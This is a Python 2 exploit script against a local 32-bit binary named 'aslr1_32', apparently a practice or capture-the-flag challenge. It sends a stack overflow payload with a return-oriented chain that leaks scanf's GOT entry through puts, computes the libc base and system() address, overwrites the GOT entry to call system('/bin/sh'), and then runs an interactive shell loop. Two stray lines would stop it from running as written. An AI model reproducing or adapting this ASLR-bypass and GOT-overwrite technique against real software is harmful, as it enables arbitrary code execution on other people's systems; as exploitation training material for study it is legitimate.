#!/usr/bin/python
import struct
import subprocess
import os
import pty
import time

def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise

def read(fd, n):
  return os.read(fd, n)

def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise

def p32(val):
  return struct.pack("<I", val)

def u32(data):
  return struct.unpack("<I", data)[0]

out_r, out_w = pty.openpty()    # to ignore buffer
s = subprocess.Popen("./aslr1_32", stdin=subprocess.PIPE, stdout=out_w)

'''
ROP
 804925a:	5f                   	pop    %edi
 804925b:	5d                   	pop    %ebp
 804925c:	c3                   	ret    
'''
0x804925a
\x5b\x92\x04\x08

pop_pop_ret = 0x804925a
pop_ret = pop_pop_ret + 1
scanf_plt = 0x8049050
puts_plt = 0x8049030
puts_got = 0x804c00c
string_fmt = 0x804a021      # "%s"
scanf_got = 0x804c014

print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n

payload  = "A"*40           # buf padding
payload += p32(puts_plt+6)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)

print `payload`

writeline(s, payload)

libc = u32(readline(out_r)[:4]) - 0x53ac0
system = libc + 0x44620

print "libc @ " + hex(libc)
print "system @ " + hex(system)

writeline(s, p32(system)+"/bin/sh\x00")

print "[+] get shell" 

while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  print read(out_r, 1024)


